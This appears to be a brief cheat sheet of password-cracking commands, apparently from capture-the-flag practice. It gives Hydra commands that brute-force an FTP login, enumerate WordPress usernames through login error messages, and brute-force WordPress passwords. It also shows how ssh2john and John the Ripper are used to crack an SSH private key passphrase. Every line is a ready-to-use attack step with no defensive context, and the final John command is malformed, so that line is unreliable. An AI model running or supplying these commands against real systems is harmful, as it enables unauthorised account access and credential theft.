#Password cracking using list with popular passwords
hydra -l user -P passlist.txt ftp://192.168.0.1
#Finding valid username
hydra -L file+name -p test target http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 30
#Crak password for username
hydra -l username -P fsocity.dic 10.10.28.2 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 30

#Cracking passphrase for private key

#Convert key to format recognized by JohnTheRipper
ssh2john.py /path/to/key > hash.txt

#Crack passphrase using wordlist
/run/john/ hash.txt --wordlist=/path